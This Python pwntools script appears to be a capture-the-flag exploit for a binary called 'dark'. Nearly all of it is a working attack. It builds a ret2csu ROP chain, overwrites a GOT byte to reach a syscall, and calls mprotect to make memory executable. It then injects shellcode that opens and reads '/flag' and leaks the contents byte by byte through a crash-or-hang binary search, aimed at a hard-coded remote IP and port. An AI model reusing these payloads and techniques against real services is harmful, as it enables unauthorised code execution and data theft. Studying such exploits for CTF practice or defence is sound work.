#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
from pwn import *
import time
import os
from hashlib import sha256

#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal=["tmux","splitw","-h"]

def start_new_program():
    program = remote( "121.41.41.111", 9999)
    return program
'''
def start_new_program():
    return process("./dark")
'''

def debug():
    gdb.attach(r,'''
    b *0x000000000401261
    ''')
r=""
 


def make_shellcode(shellcode):
    '''
    remote libc
    read
    .text:00000000000DB6D0                 cmp     rax, 0FFFFFFFFFFFFF001h

    mprotect 0xE44D0
    '''
    # 0x00601040 alarm got
    # 0x0601048  read  got
    # read(0, 0x00601040, 1)  rdi, rsi, rdx
    # 
    #0x0000000000400a53 : pop rdi ; ret 
    elf=ELF("./dark")
    read_got=elf.got["read"]
    csu_foot=0x000000000401272
    csu_head=0x000000000401258
    # 初始时rdi=0 rbx=0
    fake_stack=0x000000000404050+0x400
    pop_rsp_pop3_ret=0x0000000000401275
    payload1 = 'a'*0x10 + p64(1) #rbp=1
    # 0x400A4E pop r12; pop r13; pop r14; pop r15 ret;
    payload1 += p64(0x000000000401274) # csu_foot
    payload1 += p64(0x000000000404038) # r12 read_got ; call read
    payload1 += p64(0) # r13
    payload1 += p64(0x000000000404030) # r14 alarm got
    payload1 += p64(1) # r15
    payload1 += p64(0x000000000401258) # mov rdx, r13; mov rsi, r14; mov rdx r15; call [r12 + rbx*8]
    payload1 += 'a'*56    # padding
    payload1 += p64(csu_foot)
    payload1 += p64(0)
    payload1 += p64(1)
    payload1 += p64(read_got) # du ru rop
    payload1 += p64(0) 
    payload1 += p64(fake_stack)
    payload1 += p64(0x1000)
    payload1 += p64(csu_head)
    payload1 += 'A'*56
    payload1 += p64(pop_rsp_pop3_ret)
    payload1 += p64(fake_stack-8-8-8)
    payload1 += p64(0)*3 #padding
    payload1 = payload1.ljust(0x1000, '\x00')    
    

    payload2 = '\x45' # 覆盖alarm got最后为0x80 则指向 syscall

    alarm_got = 0x000000000404030
    
    payload3 = p64(csu_foot) 
    payload3 +=p64(0)
    payload3 +=p64(1)
    payload3 +=p64(read_got)
    payload3 +=p64(0)
    payload3 +=p64(fake_stack+0x200)
    payload3 +=p64(0xa) # make rax =  0xa
    payload3 +=p64(csu_head)
    payload3 +='A'*56
    shellcode_addr =  fake_stack+0x600
    payload3 +=p64(csu_foot)
    payload3 += p64(0) # rbx
    payload3 += p64(1) # rbp
    payload3 += p64(alarm_got) # r12 syscall
    payload3 += p64(shellcode_addr&0xfffff000) # r13 0x1+0x2+0x4 rwx
    payload3 += p64(0x4000) # r14 size
    payload3 += p64(0x7) # r15 addr
    payload3 += p64(csu_head) # mov rdx, r13; mov rsi, r14; mov rdx r15; call [r12 + rbx*8]

    payload3 += 'a'*8    # padding
    payload3 += p64(0) # rbx
    payload3 += p64(1) # rbp
    payload3 += p64(0x000000000404038) # r12 read_Got call read
    payload3 += p64(0) # r13
    payload3 += p64(shellcode_addr) # r14 bss
    payload3 += p64(0x206) # r15
    payload3 += p64(csu_head)
    payload3 += 'A'*56
    payload3 += p64(shellcode_addr)
    payload3 = payload3.ljust(0x1000, '\x00')



    payload4 = 'a'*0xa # 修改rax


    payload6 = shellcode
    payload6 = payload6.ljust(0x200, '\x00')
    payload6 += "/flag\x00"
    

    payload = payload1 + payload2 + payload3 + payload4+ payload6

    return payload

def fuck(offset,compval):
    global r
    context.arch = "amd64"
    #r = remote( "121.41.41.111", 9999)
    r=process("./dark")
    # Read flag and compare char at offset with comp value
    # exit if condition false / loop if condition true  
    SC = """
mov rax, 2                                    
mov rdi, 0x404c50         
mov rsi, 0
mov rdx, 0                  #open
syscall

xchg rax, rdi
xor rax, rax                  #rax =0
mov rsi, 0x000000000404040
mov rdx, 60
syscall                      #read

mov rcx, 0x000000000404040
add rcx, %d      #offset
mov al, byte ptr [rcx]
cmp al, %d       # compare
jge good

bad:
mov rax, 60
syscall         #exit

good:
mov rax, 0
mov rdi, 0
mov rsi, 0x000000000404050
mov rdx, 0x100
syscall            # read
jmp good
""" % (offset, compval)
    SC=asm(SC)
    payload=make_shellcode(SC)
    #debug()
    r.sendline(payload)
    #r.interactive()
    
    try:
        r.recv(1, timeout=2)  # check if service is still alive
        r.close()
        return True
    except:
        r.close()
        return False

def brute_flag():
    result = ""

    # binary search => read flag
    while (True):
        range_low = 0
        range_high = 128

        for i in range(0, 8):
            testch = (range_high + range_low)/2

            print "Test: %s" % chr(testch)

            res = fuck(len(result), testch)

            if res:
                range_low = testch
            else:
                range_high = testch

        #if testch == 0:
        #    break

        result += chr(testch)
        print "Found: %s" % result
	
    return result

brute_flag()

